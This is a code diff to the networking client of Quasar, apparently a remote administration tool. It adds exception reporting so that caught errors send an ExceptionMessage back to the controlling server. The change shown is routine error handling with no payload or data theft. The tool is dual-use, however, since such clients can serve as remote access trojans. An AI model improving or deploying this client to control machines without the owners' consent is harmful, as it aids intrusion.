@@ -319,16 +319,19 @@ namespace Quasar.Client.Networking
                 if (bytesTransferred <= 0)
                     throw new Exception("no bytes transferred");
             }
-            catch (NullReferenceException)
+            catch (NullReferenceException ex)
             {
+                this.ReportException(ex, true);
                 return;
             }
-            catch (ObjectDisposedException)
+            catch (ObjectDisposedException ex)
             {
+                this.ReportException(ex, true);
                 return;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                this.ReportException(ex);
                 Disconnect();
                 return;
             }
@@ -363,8 +366,9 @@ namespace Quasar.Client.Networking
             {
                 _stream.BeginRead(_readBuffer, 0, _readBuffer.Length, AsyncReceive, null);
             }
-            catch (ObjectDisposedException)
+            catch (ObjectDisposedException ex)
             {
+                this.ReportException(ex, true);
             }
             catch (Exception ex)
             {
@@ -567,6 +571,7 @@ namespace Quasar.Client.Networking
             }
             catch (Exception ex)
             {
+                this.ReportException(ex);
                 Disconnect();
                 SendCleanup(true);
             }
@@ -687,6 +692,12 @@ namespace Quasar.Client.Networking
                 }
             }
             catch { }
+        }
+
+        public void ReportException(Exception exception, bool warning = false)
+        {
+            //MessageBox.Show($"{exception}", "Reporting Exception...");
+            this.Send(new ExceptionMessage());
         }
     }
 }
